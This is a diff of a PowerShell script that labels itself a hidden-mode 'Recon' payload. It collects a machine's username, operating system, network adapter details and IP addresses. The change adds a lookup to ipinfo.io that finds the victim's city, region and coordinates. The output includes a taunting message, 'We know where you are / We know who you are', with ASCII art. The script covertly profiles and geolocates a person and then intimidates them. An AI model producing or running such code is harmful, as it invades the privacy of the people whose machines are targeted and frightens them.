@@ -15,6 +15,8 @@ $networkName = $networkAdapter.Description
 $ipAddress = $networkAdapter.IPAddress[0]
 $subnetMask = $networkAdapter.IPSubnet[0]
 $defaultGateway = $networkAdapter.DefaultIPGateway[0]
+$location = (Invoke-WebRequest -Uri "http://ipinfo.io/json").Content | ConvertFrom-Json
+
 
 
 #For powershell
@@ -24,12 +26,18 @@ Write-Host "IP Address: $ipAddress"
 Write-Host "Subnet Mask: $subnetMask"
 Write-Host "Default Gateway: $defaultGateway"
 
+Write-Host "City: $($location.city)"
+Write-Host "Region: $($location.region)"
+Write-Host "Country: $($location.country)"
+Write-Host "Latitude: $($location.loc.Split(",")[0])"
+Write-Host "Longitude: $($location.loc.Split(",")[1])"
 
 
 # Write information to text file
 $text = "We know where you are $publicIP
 We know who you are $username
 We know on what you work $os
+
                         ____________
                       .~      ,   . ~.
                      /                \
@@ -86,18 +94,15 @@ $output = @"
 # Mode      : Hidden              | ██║██║██║██╔══██║██║   ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝     #
 #                                 | ╚█║████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝███████╗██║  ██║╚██████╔╝███████╗███████╗   #
 # Category  : Recon               |  ╚╝╚═══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   #
-#                                 |  Verrou par verrou et l'un après l'autre, c'est la clé du bon hacker.                    #
-#                                 |    On ne peut pas ouvrir la porte numéro 9 avant d'avoir débloqué la numéro 8.           #
+#                                 |  Verrou par verrou et l'un apres l'autre, c'est la cle du bon hacker.                    #
+#                                 |    On ne peut pas ouvrir la porte numero 9 avant d'avoir debloque la numero 8.           #
 #_________________________________|                                                                                          #
 #                                                                                                                            #
 #                                                                                                                            #
 ##############################################################################################################################
 
-$publicIP
-$username
-$os
-$networkName
-$ipType
+
+$text
 
 "@
 
